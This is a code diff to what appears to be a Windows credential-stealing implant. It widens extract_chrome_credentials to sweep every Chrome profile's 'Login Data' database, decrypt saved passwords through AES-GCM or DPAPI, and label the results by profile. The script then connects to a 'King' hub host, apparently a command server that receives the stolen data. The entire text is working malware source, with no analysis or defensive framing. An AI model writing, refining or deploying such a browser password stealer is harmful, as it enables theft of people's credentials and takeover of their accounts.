@@ -472,53 +472,57 @@ def extract_chrome_credentials():
             else:
                 return b"Error: DPAPI Decryption Failed."
 
-            # --- DEEP SCAN PROFILES ---
+            # --- TOTAL RECOVERY SWEEP ---
             output = []
+            # We search EVERY folder in User Data for any file named 'Login Data'
             login_data_files = glob.glob(os.path.join(user_data_path, "**", "Login Data"), recursive=True)
 
             for login_data_path in login_data_files:
-                # Avoid temp file collisions
-                temp_db = os.path.join(os.getenv('TEMP'), f"v_task_{os.urandom(4).hex()}.db")
+                # Use a unique temp name to avoid file locks
+                temp_db = os.path.join(os.getenv('TEMP'), f"v_db_{os.urandom(2).hex()}.db")
                 try:
                     shutil.copy2(login_data_path, temp_db)
                     conn = sqlite3.connect(temp_db)
                     cursor = conn.cursor()
+                    
+                    # We pull EVERYTHING: URL, Username, and the Raw Password Blob
                     cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                     
-                    for url, user, enc_pass in cursor.fetchall():
-                        if not enc_pass: continue
+                    rows = cursor.fetchall()
+                    for url, user, enc_pass in rows:
+                        if not user and not enc_pass: continue
                         
-                        password = None
-                        try:
-                            # Strategy A: Standard AES-GCM (Try multiple offsets)
-                            # We try offset 3 (v10) and offset 0 (Raw)
-                            for offset in [3, 0]:
-                                try:
-                                    nonce = enc_pass[offset : offset + 12]
-                                    payload = enc_pass[offset + 12:]
+                        password = " [No Password Saved] "
+                        if enc_pass:
+                            try:
+                                # Try Modern Decryption
+                                if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
+                                    nonce = enc_pass[3:15]
+                                    payload = enc_pass[15:]
                                     cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                                    # Try decrypting with and without the 16-byte tag
-                                    result = cipher.decrypt(payload[:-16]).decode(errors='ignore')
-                                    if len(result) > 0:
-                                        password = result
-                                        break
-                                except: continue
-                            
-                            # Strategy B: Legacy DPAPI Fallback
-                            if not password:
-                                blob_in = DATA_BLOB(len(enc_pass), ctypes.create_string_buffer(enc_pass))
-                                blob_out = DATA_BLOB()
-                                if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
-                                    password = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode(errors='ignore')
+                                    # Try to decrypt and verify the tag
+                                    password = cipher.decrypt(payload[:-16]).decode('utf-8', errors='ignore')
+                                else:
+                                    # Try Legacy DPAPI
+                                    blob_in = DATA_BLOB(len(enc_pass), ctypes.create_string_buffer(enc_pass))
+                                    blob_out = DATA_BLOB()
+                                    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), 0, 0, 0, 0, 0, ctypes.byref(blob_out)):
+                                        password = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode('utf-8', errors='ignore')
+                            except:
+                                password = "[Decryption Failed]"
 
-                            if password and len(password.strip()) > 0:
-                                output.append(f"URL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")
-                        except: continue
+                        profile_name = os.path.basename(os.path.dirname(login_data_path))
+                        output.append(f"Profile: {profile_name}\nURL: {url}\nUser: {user}\nPass: {password}\n{'-'*20}")
+                    
                     conn.close()
                 finally:
                     if os.path.exists(temp_db): os.remove(temp_db)
 
-            return "\n".join(output).encode() if output else b"Success: Accessed DB but no passwords saved."
+            # If the output is still empty, it means the 'logins' table is physically empty
+            if not output:
+                return b"System Check: DB found but the 'logins' table contains 0 entries."
+                
+            return "\n".join(output).encode('utf-8', errors='replace')
         except Exception as e:
             return f"Final Logic Error: {str(e)}".encode()
     except Exception as e:
@@ -726,4 +730,3 @@ if __name__ == '__main__':
         print('[*] WARNING: Using default HUB_IP 192.168.100.9. Update --hub-ip if King is on a different machine.')
     print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
     connect_to_hub(args.hub_ip, args.hub_port)
-
